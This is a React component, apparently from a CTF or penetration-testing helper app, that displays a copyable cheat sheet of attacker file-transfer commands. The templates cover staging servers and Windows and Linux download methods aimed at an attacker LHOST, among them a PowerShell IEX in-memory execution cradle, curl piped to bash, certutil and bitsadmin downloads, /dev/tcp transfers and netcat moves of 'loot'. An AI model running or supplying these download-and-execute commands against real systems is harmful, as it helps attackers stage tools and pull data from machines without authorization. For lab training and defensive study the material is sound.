import React, { useState } from 'react';
import { Copy, Check, Terminal, Server, Laptop } from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { safeCopyToClipboard, playCyberSound } from '../../utils/helpers';
import { toast } from '../../store/useToastStore';

export interface FileTransferItem {
  id: string;
  os: 'windows' | 'linux' | 'universal' | 'server';
  category: 'download' | 'upload' | 'server' | 'in-memory';
  title: string;
  description: string;
  commandTemplate: string;
}

export const FileTransferCheatsheet: React.FC = () => {
  const { globalVars, soundEnabled } = useCtfStore();
  const [filterOs, setFilterOs] = useState<'all' | 'windows' | 'linux' | 'server'>('all');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '8000';
  const targetIp = globalVars.targetIp || '10.10.10.X';
  const user = globalVars.user || 'kali';
  const cred = globalVars.cred || 'kali';

  const transfers: FileTransferItem[] = [
    // Servers (Attacker Listeners)
    {
      id: 'srv-http-py3',
      os: 'server',
      category: 'server',
      title: 'Python 3 HTTP Staging Server',
      description: 'Host local directory over HTTP port 8000 (or custom LPORT).',
      commandTemplate: `python3 -m http.server ${lport}`,
    },
    {
      id: 'srv-smb-impacket',
      os: 'server',
      category: 'server',
      title: 'Impacket SMB Server (SMB2)',
      description: 'Host directory as SMB share "tools" with SMB2 support for modern Windows boxes.',
      commandTemplate: `impacket-smbserver tools $(pwd) -smb2support -user ${user} -password ${cred}`,
    },
    {
      id: 'srv-ftp-py',
      os: 'server',
      category: 'server',
      title: 'Python FTPServer (Writeable)',
      description: 'Quick writeable FTP staging server using pyftpdlib.',
      commandTemplate: `python3 -m pyftpdlib -p 21 -w -u ${user} -P ${cred}`,
    },
    {
      id: 'srv-upload-php',
      os: 'server',
      category: 'server',
      title: 'Quick Python Upload Server',
      description: 'Listen on port 8000 accepting POST file uploads via uploadserver package.',
      commandTemplate: `python3 -m uploadserver ${lport}`,
    },

    // Windows Targets
    {
      id: 'win-certutil',
      os: 'windows',
      category: 'download',
      title: 'Certutil Cache Split (Windows)',
      description: 'Download executable via built-in certutil (bypasses basic restrictions; leaves cache).',
      commandTemplate: `certutil -urlcache -split -f "http://${lhost}:${lport}/winPEAS.exe" winPEAS.exe`,
    },
    {
      id: 'win-ps-iwr',
      os: 'windows',
      category: 'download',
      title: 'PowerShell Invoke-WebRequest / iwr',
      description: 'Native PS3+ download command saving directly to disk.',
      commandTemplate: `powershell -c "Invoke-WebRequest -Uri 'http://${lhost}:${lport}/nc.exe' -OutFile 'nc.exe'"`,
    },
    {
      id: 'win-ps-webclient',
      os: 'windows',
      category: 'download',
      title: 'PowerShell WebClient DownloadFile',
      description: 'Low-footprint .NET WebClient download (compatible with older PS versions).',
      commandTemplate: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${lhost}:${lport}/nc.exe', 'nc.exe')"`,
    },
    {
      id: 'win-ps-iex',
      os: 'windows',
      category: 'in-memory',
      title: 'PowerShell In-Memory Execution (IEX)',
      description: 'Execute script directly in RAM without touching disk.',
      commandTemplate: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/PowerUp.ps1')"`,
    },
    {
      id: 'win-smb-copy',
      os: 'windows',
      category: 'download',
      title: 'Windows SMB Share Direct Copy',
      description: 'Copy directly from attacker SMB share mounted or referenced via UNC path.',
      commandTemplate: `net use \\\\${lhost}\\tools /u:${user} ${cred} && copy \\\\${lhost}\\tools\\winPEAS.exe C:\\temp\\`,
    },
    {
      id: 'win-bitsadmin',
      os: 'windows',
      category: 'download',
      title: 'Bitsadmin Background Transfer',
      description: 'Native Windows BITS job transfer.',
      commandTemplate: `bitsadmin /transfer job /download /priority normal http://${lhost}:${lport}/file.exe C:\\temp\\file.exe`,
    },

    // Linux Targets
    {
      id: 'lin-curl-out',
      os: 'linux',
      category: 'download',
      title: 'Linux Curl File Download',
      description: 'Standard curl command to save output to disk.',
      commandTemplate: `curl -s -L "http://${lhost}:${lport}/linpeas.sh" -o linpeas.sh && chmod +x linpeas.sh`,
    },
    {
      id: 'lin-curl-pipe',
      os: 'linux',
      category: 'in-memory',
      title: 'Linux Curl Pipe to Bash',
      description: 'Execute remote shell script directly in memory without writing to disk.',
      commandTemplate: `curl -s "http://${lhost}:${lport}/linpeas.sh" | bash`,
    },
    {
      id: 'lin-wget',
      os: 'linux',
      category: 'download',
      title: 'Linux Wget Download',
      description: 'Fetch payload using wget with explicit output path.',
      commandTemplate: `wget "http://${lhost}:${lport}/exploit" -O /tmp/exploit && chmod +x /tmp/exploit`,
    },
    {
      id: 'lin-dev-tcp',
      os: 'linux',
      category: 'download',
      title: 'Linux /dev/tcp Raw Transfer (Living off the Land)',
      description: 'Download file when curl/wget are unavailable using bash built-in /dev/tcp.',
      commandTemplate: `exec 3<>/dev/tcp/${lhost}/${lport}; echo -e "GET /file HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 > /tmp/file`,
    },
    {
      id: 'lin-nc-rx',
      os: 'linux',
      category: 'download',
      title: 'Netcat File Transfer (Target Listening)',
      description: 'Target receives file over raw TCP socket from attacker.',
      commandTemplate: `nc -lvnp 9001 > /tmp/loot.tar.gz  # Attacker sends: nc -vn ${targetIp} 9001 < loot.tar.gz`,
    },
    {
      id: 'lin-base64',
      os: 'linux',
      category: 'download',
      title: 'Terminal Base64 Copy-Paste Transfer',
      description: 'Transfer small binaries directly through clipboard over restricted shell.',
      commandTemplate: `cat file | base64 -w 0  # Paste on target: echo "<BASE64>" | base64 -d > file`,
    },
  ];

  const handleCopy = async (cmd: string, id: string) => {
    const ok = await safeCopyToClipboard(cmd);
    if (ok) {
      setCopiedId(id);
      toast.success('Transfer command copied to clipboard');
      if (soundEnabled) playCyberSound('copy');
      setTimeout(() => setCopiedId(null), 2000);
    }
  };

  const filtered = transfers.filter((t) => {
    if (filterOs === 'all') return true;
    return t.os === filterOs;
  });

  return (
    <div className="space-y-4">
      {/* OS Filter Chips */}
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-1.5">
          <button
            type="button"
            onClick={() => setFilterOs('all')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
              filterOs === 'all' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
            }`}
          >
            All Methods ({transfers.length})
          </button>
          <button
            type="button"
            onClick={() => setFilterOs('server')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
              filterOs === 'server' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
            }`}
          >
            Attacker Servers (Listeners)
          </button>
          <button
            type="button"
            onClick={() => setFilterOs('windows')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
              filterOs === 'windows' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
            }`}
          >
            Windows Target Downloads
          </button>
          <button
            type="button"
            onClick={() => setFilterOs('linux')}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
              filterOs === 'linux' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
            }`}
          >
            Linux Target Downloads
          </button>
        </div>

        <div className="text-xs text-muted font-mono">
          LHOST: <span className="text-accent">{lhost}</span> | LPORT: <span className="text-accent">{lport}</span>
        </div>
      </div>

      {/* Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {filtered.map((item) => {
          const isCopied = copiedId === item.id;
          return (
            <div
              key={item.id}
              className="p-3.5 rounded-xl border border-subtle bg-surface-card space-y-2.5 flex flex-col justify-between hover:border-strong transition-colors"
            >
              <div>
                <div className="flex items-center justify-between gap-2">
                  <h4 className="text-xs font-semibold text-primary flex items-center gap-1.5">
                    {item.os === 'windows' && <Laptop className="w-3.5 h-3.5 text-callout-info-fg" />}
                    {item.os === 'linux' && <Terminal className="w-3.5 h-3.5 text-callout-success-fg" />}
                    {item.os === 'server' && <Server className="w-3.5 h-3.5 text-callout-warn-fg" />}
                    <span>{item.title}</span>
                  </h4>
                  <span className="text-[10px] uppercase font-mono px-1.5 py-0.5 rounded bg-surface-sunken text-muted border border-subtle">
                    {item.category}
                  </span>
                </div>
                <p className="text-[11px] text-muted mt-1 leading-relaxed">{item.description}</p>
              </div>

              <div className="space-y-1.5">
                <div className="relative group">
                  <pre className="p-2.5 rounded-lg bg-surface-sunken border border-subtle text-xs font-mono text-primary overflow-x-auto whitespace-pre-wrap break-all select-all">
                    {item.commandTemplate}
                  </pre>
                  <button
                    type="button"
                    onClick={() => handleCopy(item.commandTemplate, item.id)}
                    className={`absolute right-2 top-2 p-1.5 rounded-md border text-xs transition-colors cursor-pointer active:scale-95 ${
                      isCopied
                        ? 'bg-callout-success-bg text-callout-success-fg border-callout-success-border'
                        : 'bg-surface-card border-subtle text-secondary hover:text-accent hover:border-accent shadow-xs'
                    }`}
                    title="Copy command to clipboard"
                  >
                    {isCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};
